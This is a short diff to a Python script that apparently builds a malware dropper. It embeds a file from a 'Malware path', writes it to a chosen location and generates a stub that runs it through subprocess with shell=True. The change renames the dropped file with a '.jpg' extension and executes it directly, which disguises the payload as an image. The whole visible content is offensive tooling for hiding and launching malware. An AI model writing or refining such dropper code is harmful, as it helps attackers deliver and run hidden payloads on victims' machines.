@@ -12,7 +12,7 @@ def main():
     input2 = entry3.get()
     # Open file
     file_name = malwarename  # Malware path
-    new_file_name = input2  # Path to drop file
+    new_file_name = input2+".jpg"  # Path to drop file
     file = open(file_name, "rb")
     file_data = file.read()
     file.close()
@@ -37,7 +37,7 @@ def main():
     stub += "new_file.close()\n"
     # Execute file
     stub += "import subprocess\n"
-    stub += 'proc = subprocess.Popen("python3 "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n'
+    stub += 'proc = subprocess.Popen(new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n'
 
     # Save the Stub
     stub_name = str(input2)
